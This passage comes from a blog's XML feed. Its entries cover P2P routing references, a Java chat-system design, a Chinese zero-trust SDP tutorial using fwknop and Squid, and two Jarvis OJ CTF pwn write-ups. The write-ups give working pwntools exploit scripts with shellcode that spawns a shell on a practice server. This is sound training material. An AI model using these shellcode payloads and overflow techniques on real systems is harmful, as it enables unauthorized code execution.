Papers.</p></li><li><p>[3]Stoica, I. ,  Morris, R. T. ,  Karger, D. ,  Kaashoek, F. , &amp;  Balakrishnan, H. . (2001). Chord : a scalable peer-to-peer lookup service for internet applications. ACM SIGCOMM Computer Communication Review, 31.</p></li><li><p>[4]Peng, X. Y., Yang, S. B., &amp; Chen, D. F.. (2004). Mcan:  A Scalable Modified Content -Addressable Network. Computer Science (11), 130-134.</p></li><li><p>[5]（2006). Analysis of structured P2P overlay networks algorithms based on DHT. Journal of Chongqing University, 000(0z1), 131-134.</p></li><li><p>[6]Yang, Y. H. . (2014). Compare with Algorithms of P2P Resource Location based on DHT. Information Security and Technology.</p></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;[Abstract] P2P (Peer-to-Peer) overlay network is one of the most popular distributed networks. It not only has advantages in scalability, but also can maximize the use of computing and storage resources of each terminal nodes. In the last ten years, P2P system is a hot topic in IT field. Recently, most researchers study structed P2P system, which is better than the former P2P structure. This paper focus on the routing algorithms based on DHT in second generation of P2P overlay networks.&lt;/p&gt;</summary>
    
    
    
    <category term="Security Framework" scheme="https://coldwave96.github.io/categories/Security-Framework/"/>
    
    <category term="P2P" scheme="https://coldwave96.github.io/categories/Security-Framework/P2P/"/>
    
    
    <category term="Routing" scheme="https://coldwave96.github.io/tags/Routing/"/>
    
    <category term="Peer-to-Peer" scheme="https://coldwave96.github.io/tags/Peer-to-Peer/"/>
    
  </entry>
  
  <entry>
    <title>A Simple Chat System</title>
    <link href="https://coldwave96.github.io/2021/09/17/ChatSystem/"/>
    <id>https://coldwave96.github.io/2021/09/17/ChatSystem/</id>
    <published>2021-09-17T07:38:03.000Z</published>
    <updated>2021-09-17T07:38:03.000Z</updated>
    
    <content type="html"><![CDATA[<p>This is a simple example of distributed system implementation.</p><span id="more"></span><h2 id="1-Introduction"><a href="#1-Introduction" class="headerlink" title="1.Introduction"></a>1.Introduction</h2><p>The project is to create a C&#x2F;S architectural model-based chat system. The chat system consists of a chat server and one or more chat clients. The chat server is able to accept multiple incoming TCP connections. The chat server can create a new chat room and move between existing chat rooms. Messages sent by a chat client will be broadcast to all clients which are in the same chat room.</p><h2 id="2-Protocol-Implementation"><a href="#2-Protocol-Implementation" class="headerlink" title="2.Protocol Implementation"></a>2.Protocol Implementation</h2><p>There are 8 protocols needs to be implemented in this chat system. At the beginning when a client connects to the server, the server will response with some initialized messages. After the socket is established, the client would be able to change identity, join rooms, ask for room list and room content information, create room, delete room, send messages, and quit the service. The following figures show how the server and client react to the eight protocols.</p><p><img src="/img/ChatSystem/Picture1.png" alt="Protocol diagram of the chat server"></p><p><img src="/img/ChatSystem/Picture2.png" alt="Protocol diagram of the chat client"></p><h3 id="2-1-Initialization"><a href="#2-1-Initialization" class="headerlink" title="2.1.Initialization"></a>2.1.Initialization</h3><p>The server will listen to the specified port. Once a client connects to the server, the server will start a thread to handle this socket and do following things:</p><ul><li>1.Responds with NewIdentity message.</li><li>2.Moves the client into MainHall.</li><li>3.Sends RoomChange message to all the clients in the MainHall.</li><li>4.Sends RoomList message to the client.</li><li>5.Sends RoomContent message to the client.</li></ul><p>Illustrated by the following figure:</p><p><img src="/img/ChatSystem/Picture3.png" alt="Initialization between the server and clients"></p><h3 id="2-2-Identity-Change-Protocol"><a href="#2-2-Identity-Change-Protocol" class="headerlink" title="2.2.Identity Change Protocol"></a>2.2.Identity Change Protocol</h3><p>When client sends a IdentityChange message to the server, the server will respond with a NewIdentity message. If the client wants to change to an invalid or existed identity, the value of former and identity field in NewIdentity message is same. And this NewIdentity message is only sent to the corresponding client. Otherwise, server will broadcast this NewIdentity message to all clients in the same chat room.</p><p><img src="/img/ChatSystem/Picture4.png" alt="Identity Change Protocol between the server and clients"></p><h3 id="2-3-Join-Room-Protocol"><a href="#2-3-Join-Room-Protocol" class="headerlink" title="2.3.Join Room Protocol"></a>2.3.Join Room Protocol</h3><p>When client sends a Join message to the server, the server will respond with a RoomChange message. If the client wants to join an invalid or non-existed room, the value of former and roomid in RoomChange message is same. And this RoomChange message is only sent to the corresponding client. Otherwise, server will broadcast this RoomChange message to all clients in the former and changed room. If client joins the MainHall, server will also send RoomList message and RoomComtents message after RoomChange message.</p><p><img src="/img/ChatSystem/Picture5.png" alt="Join Room Protocol between the server and clients"></p><h3 id="2-4-Create-Room-Protocol"><a href="#2-4-Create-Room-Protocol" class="headerlink" title="2.4.Create Room Protocol"></a>2.4.Create Room Protocol</h3><p>When client sends a CreateRoom message, the server will respond with a RoomList message. If the client wants to create a valid room, the server will respond with a RoomList message with the new room in the list.</p><p><img src="/img/ChatSystem/Picture6.png" alt="Create Room Protocol between the server and clients"></p><h3 id="2-5-Room-Content-Protocol"><a href="#2-5-Room-Content-Protocol" class="headerlink" title="2.5.Room Content Protocol"></a>2.5.Room Content Protocol</h3><p>When client sends a Who message, the server will respond with a RoomContents Message.</p><p><img src="/img/ChatSystem/Picture7.png" alt="Room Content Protocol between the server and clients"></p><h3 id="2-6-Room-List-Protocol"><a href="#2-6-Room-List-Protocol" class="headerlink" title="2.6.Room List Protocol"></a>2.6.Room List Protocol</h3><p>When client sends a List message, the server will respond with a RoomList message.</p><p><img src="/img/ChatSystem/Picture8.png" alt="Room List Protocol between the server and clients"></p><h3 id="2-7-Message-Protocol"><a href="#2-7-Message-Protocol" class="headerlink" title="2.7.Message Protocol"></a>2.7.Message Protocol</h3><p>When client input anything except for the commands, the client will take the input as messages and send the Message to the server. Then server will broadcast the Message to all clients in the same room.</p><p><img src="/img/ChatSystem/Picture9.png" alt="Message Protocol between the server and clients"></p><h3 id="2-8-Delete-Room-Protocol"><a href="#2-8-Delete-Room-Protocol" class="headerlink" title="2.8.Delete Room Protocol"></a>2.8.Delete Room Protocol</h3><p>When client sends Delete message, the server will do the following things:</p><ul><li>1.Check whether the room is existed, and the owner is the client or not.</li><li>2.If all conditions are met, server will move all users in that room to the MainHall and delete the room. Also, the server will send RoomChange message as well as RoomList message and RoomContents message to these clients.</li><li>3.Send RoomList message to the client which want to delete a room.</li></ul><p><img src="/img/ChatSystem/Picture10.png" alt="Delete Room Protocol between the server and client"></p><h3 id="2-9-Quit-Protocol"><a href="#2-9-Quit-Protocol" class="headerlink" title="2.9.Quit Protocol"></a>2.9.Quit Protocol</h3><p>Client just sends a Quit message to the server then shut down the program. If the client owns a room, then the server will remove the owner of this room. After that server will remove this client from its current room and check if it is the last client in that room. Server will delete that room if that room is empty, and its owner is also disconnected from the server. At last server removes the client socket from the socket list.</p><h2 id="3-Discussion-About-Concurrency"><a href="#3-Discussion-About-Concurrency" class="headerlink" title="3.Discussion About Concurrency"></a>3.Discussion About Concurrency</h2><p>Concurrency is an important feature of distributed system. Both services and applications provide resources that can be shared by clients in a distributed system. In this chat system, some concurrency has been realized, but there are also some problems have not been resolved when dealing with some concurrency.</p><p>First let’s discuss about the concurrency that the system has implemented. When the server starts, it will listen on the specified port. Once there is a socket connection request from the client, the server will create a new thread to process it. At the same time, the main program of the server is still listening to the specified port and waiting for a new socket connection request from another client. Different socket connections are processed by different threads and do not interfere with each other, so services and applications allow multiple client requests to be processed concurrently.</p><p>However, the concurrency implemented in this system is extremely limited. Next let’s discuss the limitation of the current system. First, the system does not consider high concurrency. After the client establishes a socket connection with the server, the thread handling the socket connection will run until the client actively exits the system. Although threads may occupy very few resources, the performance of the server is limited, and thread resources are limited as well. This will make it difficult for the system to deal with high concurrency. Second, there is no lock mechanism for access to shared resources in the system. Therefore, theoretically, different processes may operate on the same resource at the same time, which may lead to conflicts and inconsistent results. For example, if two users want to create a room with the same name at the same time, unpredictable error results may occur. Therefore, lock mechanism should be introduced to ensure the safe use of shared resources in a concurrent environment.</p><p>Similarly, the client also processes its socket connection with the server by thread. The client needs to listen to the user’s input and process the messages sent by the server at any time. This is the concurrency problem faced by the client. However, this chat system does not solve this problem, but processes user input and server pushed messages in the same thread. It may take two threads to deal with these two things separately. Then, like the server, this processing method also faces the same problem of accessing shared resource. In addition, if the user is entering something and the server pushes a message, it is also a problem how the separate thread scheme handles the situation.</p><h2 id="4-Multi-server-Architecture-Design"><a href="#4-Multi-server-Architecture-Design" class="headerlink" title="4.Multi-server Architecture Design"></a>4.Multi-server Architecture Design</h2><p>For a multi-server chat system, we have to do the following:</p><ul><li>1.High availability: No single node failure should cause service unavailability.</li><li>2.Easy to scale: Horizontally scalable, with the ability to adapt to different amounts of online users.</li><li>3.High concurrency and low latency: Be able to support a large number of users sending and receiving messages at the same time, with a delay of milliseconds from the message being sent to the delivery of all online ends.</li><li>4.Client compatibility: New applications are able to interoperate across multiple devices at the same time, such as web, mobile and desktop, and even smart TV.<br>Thus, the overall framework design is shown in the figure below.</li></ul><p><img src="/img/ChatSystem/Picture11.png" alt="The overall framework design of multi-server chat system"></p><p>The client layer is supposed to deal with compatibility issues with various devices, message channel management and maintenance, and data security.</p><p>The diversity of client implementation technologies leads to differences in the underlying data communication protocols between the client and the gateway. Therefore, the gateway layer is responsible for managing client connections, protocol conversion, logic for data security and efficient distribution of broadcast messages.</p><p>In addition to serving as a relay point for messages, the routing layer also assumes the role of load balancing and high availability. It is easier to expand capacity when the processing capacity of a single business node reaches a bottleneck. When a network failure occurs in a server cluster, it can be switched to the backup server cluster to ensure service availability.</p><p>The server layer handles the business messages of the chat system.<br>Now let’s deep dive into the multi-server chat system and focus on the message protocols.</p><p>For the client, it will try to connect to the gateway depending on the distance of the gateway in the list. Once the TCP keepalive connection established, the server can do the same thing as the current chat client.</p><p>There are two options for handling the communication between servers at router layer.</p><p>First option is to provide a master server. The master server has a router table. All messages are pushed to the master server, which distributes the messages to different service servers according to the router table. This places a high demand on the performance of the master server.</p><p>Another option is to implement a message queue based on a publish-subscribe system. The basic structure is shown in the figure bellow.</p><p><img src="/img/ChatSystem/Picture12.png" alt="Cross-server communication via message queues"></p><p>Assume there is a client 1 login in at the ChatServer 1 and a client 2 login in at the ChatServer 2. ChatServer 1 and ChatServer 2 will subscribe to messages about “client 1” and “client 2”in the message queue respectively. If client 2 sends a message to client 1, the ChatServer 2 will publish the message with a flag “client 1” to the message queue. Then message queue will notify ChatServer 1 that someone sends a message to client 1. Chatserver 1 will access this message and send it to client 1.</p><p>Message queues also have disadvantages. First, once the message queue crashed, so doed the entire system. Second, message queue makes the system more complex. How to ensure that messages are not consumed repeatedly? How to deal with the case of message loss? How to ensure the sequential nature of message delivery? These are the challenges that need to be addressed. Finally, there is the issue of consistency. If a request requires multiple operations, but one of them fails. Although the feedback to the user is success, the request is actually not fully executed. In general, however, the advantages of message queues outweigh the disadvantages, so it is a better choice than the first option.</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;This is a simple example of distributed system implementation.&lt;/p&gt;</summary>
    
    
    
    <category term="Program" scheme="https://coldwave96.github.io/categories/Program/"/>
    
    <category term="Java" scheme="https://coldwave96.github.io/categories/Program/Java/"/>
    
    
    <category term="Github" scheme="https://coldwave96.github.io/tags/Github/"/>
    
  </entry>
  
  <entry>
    <title>开源组件实现 Software Defined Perimeter</title>
    <link href="https://coldwave96.github.io/2021/06/08/SoftwareDefinedPerimeter/"/>
    <id>https://coldwave96.github.io/2021/06/08/SoftwareDefinedPerimeter/</id>
    <published>2021-06-08T01:03:22.000Z</published>
    <updated>2021-06-08T01:03:22.000Z</updated>
    
    <content type="html"><![CDATA[<p>零信任安全是当下一个比较火热的话题，很多厂家都在尝试将其落地，整合到企业安全框架之中，实现产品化。零信任安全其中一种比较可行的实现方案是通过SDP(Software Defined Perimeter)，本文尝试通过现有的开源组件实现SDP。</p><span id="more"></span><h2 id="参考模型"><a href="#参考模型" class="headerlink" title="参考模型"></a>参考模型</h2><p>本次尝试主要参考以下模型：</p><ul><li><p><a href="https://www.beyondcorp.com/">Google’s BeyondCorp</a></p></li><li><p><a href="https://cloudsecurityalliance.org/group/software-defined-perimeter/#_overview">Cloud Security Alliance model of Software Defined Perimeter</a></p></li></ul><h2 id="工具列表"><a href="#工具列表" class="headerlink" title="工具列表"></a>工具列表</h2><p><a href="http://www.cipherdyne.org/">fwknop</a> - Used to allow the SDP server to remain completely hidden from unauthorized use.  With this tool, the gateway server can be configured with 0 inbound port access.  The net result is that the gateway server is more hardened against port scanning, DDoS attacks, etc.  This component will be optional as the client component is not readily available on all major platforms (ie. iPhone).  This project is definitely worth a look for anyone looking to contribute to a really awesome open source project!</p><p><a href="http://www.squid-cache.org/">Squid</a> - Used to provide authorization to upstream resources.  Squid is being used because of it’s ability to use external authentication helpers and assign access based on group memberships from either a common database, or LDAP server.  Squid also gives us the granularity to apply rules based on destination host, URI, port or a combination.</p><h2 id="测试拓扑"><a href="#测试拓扑" class="headerlink" title="测试拓扑"></a>测试拓扑</h2><p><img src="/img/SDP/SDP1.png" alt="测试拓扑图"></p><h2 id="方案简述"><a href="#方案简述" class="headerlink" title="方案简述"></a>方案简述</h2><p>网络边界部署边界服务器，在边界服务器上安装Squid反向代理内网Web服务。同时在边界服务器上安装并开启fwknop-server，在客户端上安装fwknop-client，通过配置实现单包认证访问。</p><h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h3><p>网络拓扑比较简单，就不赘述搭建过程，进入正题。在内网Web服务器上搭建HTTP网站，关于如何在Winserver 2008 R2上搭建网站也很简单就直接跳过。现在我们搭建好的网站是这样的：</p><p><img src="/img/SDP/SDP2.png"></p><h3 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h3><p>在边界服务器上安装Squid，由于本次边界服务器是Ubuntu系统，所以输入<code>sudo apt isntall squid</code>即可。然后通过<code>sudo vim /etc/squid/squid.conf</code>命令修改squid的配置文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#http_port 3128</span><br><span class="line">http_port 10.0.0.11:80 accel vhost vport</span><br><span class="line">cache_peer 192.168.88.10 parent 80 0 no-query no_digest originserver</span><br></pre></td></tr></table></figure><p>修改完成后通过<code>sudo systemctl restart squid</code>命令重启squid，这时候访问<code>http://10.0.0.11</code>就可以看到Step 1中搭建的网站。至此，HTTP反向代理就完成了。</p><h3 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h3><p>本次测试选用的客户端是Ubuntu，直接通过<code>sudo apt install fwknop-client</code>即可安装fwknop的客户端，本次测试安装的是2.6.9版本。如果是Windows端则要去<a href="http://www.cipherdyne.org/">fwknop官网</a>去下载源代码自行编译。</p><p>安装好fwknop-client之后执行<code>sudo fwknop -A tcp/80 -a 10.0.0.14 -D 10.0.0.11 --key-gen --use-hmac --save-rc-stanza</code>生成单包认证的Key。命令执行完之后会生成一个<code>.fwknoprc</code>文件，同时会告知文件位置。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-A tcp/80           请求服务端打开的端口及其协议；</span><br><span class="line">-a 10.0.0.14        客户端的IP地址；</span><br><span class="line">-D 10.0.0.11        服务端的IP地址；</span><br><span class="line">-key-gen            生成一个加密密钥；</span><br><span class="line">--use-hmac          采用hmac加密认证方式；</span><br><span class="line">--save-rc-stanza    保存以上参数的执行结果。</span><br></pre></td></tr></table></figure><p>通过<code>sudo grep KEY /home/User/.fwknoprc</code>命令即可获取Key。</p><p><img src="/img/SDP/SDP3.png"></p><h3 id="Step-4"><a href="#Step-4" class="headerlink" title="Step 4"></a>Step 4</h3><p>在边界服务器上通过<code>sudo apt install fwknop-server</code>安装fwknop服务端。然后输入<code>sudo vim /etc/fwknop/access.conf</code>修改服务端参数，将Step 3中客户端的Key加入配置文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SOURCE                 ANY</span><br><span class="line">REQUIRE_SOURCE_ADDRESS Y</span><br><span class="line">OPEN_PORTS             tcp/80</span><br><span class="line">KEY_BASE64             rvyA5SgenTMOagiBJJER4otC+6hdbOxXSZKW8ZN7Bsk=</span><br><span class="line">HMAC_KEY_BASE64        MtCbW46/8PCOLk7BImbLhtwSuXbPmCIyecZvmuY5Nx8NQ1PLrrqgEEumgq7YjhDXS6cpwHX/wbZ6ZckoX6dI4A==</span><br></pre></td></tr></table></figure><p>然后还需要修改<code>/etc/feknop/fwknopd.conf</code>文件，将监听的网卡修改为机器外网网卡：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># Define the ethernet interface on which we will sniff packets.</span><br><span class="line"># Default if not set is eth0.  The &#x27;-i &lt;intf&gt;&#x27; command line option overrides</span><br><span class="line"># the PCAP_INTF setting.</span><br><span class="line">#</span><br><span class="line">PCAP_INTF                   ens33;</span><br></pre></td></tr></table></figure><p>最后通过iptables实现对80端口的隐藏：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo iptables -I INPUT 1 -i ens33  -p tcp --dport 80 -j DROP</span><br><span class="line">sudo iptables -I INPUT 1 -i ens33 -p tcp --dport 80 -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT</span><br></pre></td></tr></table></figure><p>运行<code>sudo fwknopd reload</code>命令重启fwknopd服务，可通过<code>sudo fwknopd -S</code>命令查看服务状态，通过<code>sudo fwknopd --fw-list-all</code>命令查看iptables规则。</p><p>这样边界服务器的设置就完成了。</p><h3 id="Step-5"><a href="#Step-5" class="headerlink" title="Step 5"></a>Step 5</h3><p>此时所有地址都无法访问边界服务器的HTTP服务，nmap扫描的结果如下：</p><p><img src="/img/SDP/SDP4.png"></p><p>而当我们在client上执行<code>sudo fwknop -n 10.0.0.11</code>命令发送单包认证后，会发现此时80端口已经对client开放（如果不做任何操作30s后会自动关闭，更多配置在服务端的fwknop配置文件中）：</p><p><img src="/img/SDP/SDP5.png"></p><p>这个时候client就可以访问到搭建在内网的HTTP服务了。</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>结合下面的代理工具我们可以实现一些自动化以及非Web服务的单包认证机制。</p><p><a href="https://openvpn.net/index.php/open-source.html">OpenVPN</a> - Used to ensure a completely encrypted communication channel between personal devices (laptop, cell phone, etc) and the gateway server.  OpenVPN includes support on every major platform and is simple to adjust the configuration to the user’s needs.  In our model, we are not using OpenVPN in the traditional sense of a VPN as the gateway server will not be configured to forward traffic directly to an upstream device.  OpenVPN also supports additional authentication plugins allowing things like two-factor authentication to become possible. OpenVPN also provides the awesome PKI tool easy-rsa. easy-rsa gives us the ability to provision and manage certificates for all of our components.</p><p><a href="https://github.com/darkk/redsocks">Redsocks Proxy</a> - This tool will be used to forward non-web traffic through our Squid proxy.</p><p>以及更多的fwknop指导在<a href="http://www.cipherdyne.org/fwknop/docs/fwknop-tutorial.html">这里</a>。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;零信任安全是当下一个比较火热的话题，很多厂家都在尝试将其落地，整合到企业安全框架之中，实现产品化。零信任安全其中一种比较可行的实现方案是通过SDP(Software Defined Perimeter)，本文尝试通过现有的开源组件实现SDP。&lt;/p&gt;</summary>
    
    
    
    <category term="Security Framework" scheme="https://coldwave96.github.io/categories/Security-Framework/"/>
    
    <category term="Zero Trust" scheme="https://coldwave96.github.io/categories/Security-Framework/Zero-Trust/"/>
    
    
    <category term="Zero Trust" scheme="https://coldwave96.github.io/tags/Zero-Trust/"/>
    
    <category term="SDP" scheme="https://coldwave96.github.io/tags/SDP/"/>
    
  </entry>
  
  <entry>
    <title>Jarvis OJ - Calcexe の Write-Up</title>
    <link href="https://coldwave96.github.io/2021/02/04/Calcexe/"/>
    <id>https://coldwave96.github.io/2021/02/04/Calcexe/</id>
    <published>2021-02-04T03:28:26.000Z</published>
    <updated>2021-02-04T03:28:26.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>题目捎带迷惑性，文件后缀为<code>.exe</code>，看起来是windows下的运行程序，结果在windows上根本无法运行。</p><span id="more"></span><h2 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h2><p>checksec：</p><p><img src="/img/Calcexe/Calcexe1.png"></p><p>依然是32位的ELF文件。</p><p>将程序在IDA中打开，在main函数中发现定义了10个功能：</p><p><img src="/img/Calcexe/Calcexe2.png"></p><p>这是功能申明函数sub_804A719：</p><p><img src="/img/Calcexe/Calcexe3.png"></p><p>所以程序运行是这样的：</p><p><img src="/img/Calcexe/Calcexe4.png"></p><h2 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h2><p>由于程序很长，所以就挑选关键部分来说。 程序申明了10个函数，如果能够控制这些函数的指针那么就可以控制程序跳转执行shellcode。</p><p>而在主函数后发现处理function的函数：</p><p><img src="/img/Calcexe/Calcexe5.png"></p><p><code>strtok()</code>是分割字符串的函数，这里用来处理空格。0x61是<code>&#39;=&#39;</code>，0x34是<code>&#39;“&#39;</code>，所以根据伪代码发现程序允许通过<code>var</code>参数声明变量，命令格式为<code>var variable = “value”</code>。</p><p>这一段程序中还提到了下面的函数：</p><p><img src="/img/Calcexe/Calcexe6.png"></p><p>分析sub_804A820函数发现程序寻址是通过比较变量名实现的，所以即使<code>var add = “eval”</code>也是程序允许的，这样我们就可以控制函数指针了。因此直接把某个函数的method改成shellcode即可。</p><h2 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h2><p>解题脚本如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context(arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;)</span><br><span class="line"></span><br><span class="line">sh = remote(&quot;pwn2.jarvisoj.com&quot;, 9892)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">payload = &#x27;var add = &quot;&#x27;+ shellcode + &#x27;&quot;&#x27;</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(&quot;&gt;&quot;, payload)</span><br><span class="line">sh.sendline(&#x27;+&#x27;)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line">sh.close()</span><br></pre></td></tr></table></figure><p>脚本运行结果：</p><p><img src="/img/Calcexe/Calcexe7.png"></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h2&gt;&lt;p&gt;题目捎带迷惑性，文件后缀为&lt;code&gt;.exe&lt;/code&gt;，看起来是windows下的运行程序，结果在windows上根本无法运行。&lt;/p&gt;</summary>
    
    
    
    <category term="WriteUPs" scheme="https://coldwave96.github.io/categories/WriteUPs/"/>
    
    <category term="JarvisOJ" scheme="https://coldwave96.github.io/categories/WriteUPs/JarvisOJ/"/>
    
    
    <category term="PWN" scheme="https://coldwave96.github.io/tags/PWN/"/>
    
    <category term="Stack" scheme="https://coldwave96.github.io/tags/Stack/"/>
    
  </entry>
  
  <entry>
    <title>Jarvis OJ - Add の Write-Up</title>
    <link href="https://coldwave96.github.io/2021/01/28/Add/"/>
    <id>https://coldwave96.github.io/2021/01/28/Add/</id>
    <published>2021-01-28T02:35:37.000Z</published>
    <updated>2021-01-28T02:35:37.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>Add是MIPS架构的一道入门级别的栈溢出题，MIPS架构是一种采取精简指令集（RISC）的处理器架构。</p><span id="more"></span><h2 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h2><p>checksec发现是MIPS架构的32位程序：</p><p><img src="/img/Add/Add1.png"></p><p>连接到服务器端看下程序运行逻辑：</p><p><img src="/img/Add/Add2.png"></p><p>看起来是个简单的加法计算器。</p><h2 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h2><p>Ghidra反编译看下main函数的代码：</p><p><img src="/img/Add/Add3.png"></p><p><img src="/img/Add/Add4.png"></p><p>结合retdec反编译的C代码：</p><p><img src="/img/Add/Add5.png"></p><p>在LAB_00400b18中有这样一个片段：</p><p><img src="/img/Add/Add6.png"></p><p>根据main函数的代码发现buf放的是输入内容，而程序接受输入的时候是遇到\n才停止，所以存在输入过长导致栈溢出的问题。</p><p>上图中片段可以实现打印buf的地址，想要执行这个功能需要满足buf和challenge相等，buf是由我们控制的。</p><p>&amp;emsp;&amp;emspchallenge表面上是rand()生成的随机数，但是由于随机种子是由srand(0x123456)生成的，即为固定值，导致challenge也是固定值。</p><p>通过上面的分析我们可以得到栈上buf的地址，加上程序没有NX保护。所以当在buf中布置好shellcode控制程序跳转执行即可。</p><h2 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h2><p>利用cyclic生成200个字节，通过调试发现溢出偏移量为112即0x70。这里要注意只有退出程序才会回到返回地址，所以最后需要一个退出的操作。</p><p>另外在调试中发现如果直接部署在buf上，在shellcode中指令会将&#x2F;bin&#x2F;sh字符串修改导致get shell 失败。所以需要将shellcode再偏移4或8和字节。</p><p>利用msfvenom生成payload：</p><p><img src="/img/Add/Add7.png"></p><h2 id="Step-4"><a href="#Step-4" class="headerlink" title="Step 4"></a>Step 4</h2><p>下面是PWN脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from ctypes import CDLL</span><br><span class="line"></span><br><span class="line">sh = remote(&quot;pwn2.jarvisoj.com&quot;, 9889)</span><br><span class="line"></span><br><span class="line">dll = CDLL(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span><br><span class="line">dll.srand(0x123456)</span><br><span class="line">key = dll.rand()</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(&quot;help.\n&quot;, str(key))</span><br><span class="line">sh.recvuntil(&quot;Your input was&quot;)</span><br><span class="line">stack_addr = int(sh.recvline().strip(), 16)</span><br><span class="line"></span><br><span class="line">buf =  b&quot;&quot;</span><br><span class="line">buf += b&quot;\x66\x06\x06\x24\xff\xff\xd0\x04\xff\xff\x06\x28\xe0&quot;</span><br><span class="line">buf += b&quot;\xff\xbd\x27\x01\x10\xe4\x27\x1f\xf0\x84\x24\xe8\xff&quot;</span><br><span class="line">buf += b&quot;\xa4\xaf\xec\xff\xa0\xaf\xe8\xff\xa5\x27\xab\x0f\x02&quot;</span><br><span class="line">buf += b&quot;\x24\x0c\x01\x01\x01\x2f\x62\x69\x6e\x2f\x73\x68\x00&quot;</span><br><span class="line"></span><br><span class="line">payload = &#x27;0&#x27;*4 + buf.ljust(0x70 - 4, &#x27;0&#x27;) + p32(stack_addr + 4)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.sendline(&#x27;exit&#x27;)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line">sh.close()</span><br></pre></td></tr></table></figure><p>脚本运行结果：</p><p><img src="/img/Add/Add8.png"></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h2&gt;&lt;p&gt;Add是MIPS架构的一道入门级别的栈溢出题，MIPS架构是一种采取精简指令集（RISC）的处理器架构。&lt;/p&gt;</summary>
    
    
    
    <category term="WriteUPs" scheme="https://coldwave96.github.io/categories/WriteUPs/"/>
    
    <category term="JarvisOJ" scheme="https://coldwave96.github.io/categories/WriteUPs/JarvisOJ/"/>
    
    
    <category term="PWN" scheme="https://coldwave96.github.io/tags/PWN/"/>
    
    <category term="Stack" scheme="https://coldwave96.github.io/tags/Stack/"/>
    
    <category term="MIPS" scheme="https://coldwave96.github.io/tags/MIPS/"/>
    
  </entry>
  
  <entry>
    <title>Jarvis OJ - Typo の Write-Up</title>
    <link href="https://coldwave96.github.io/2021/01/20/Typo/"/>
    <id>https://coldwave96.github.io/2021/01/20/Typo/</id>
    <published>2021-01-20T06:09:22.000Z</published>
    <updated>2021-01-20T06:09:22.000Z</updated>
    
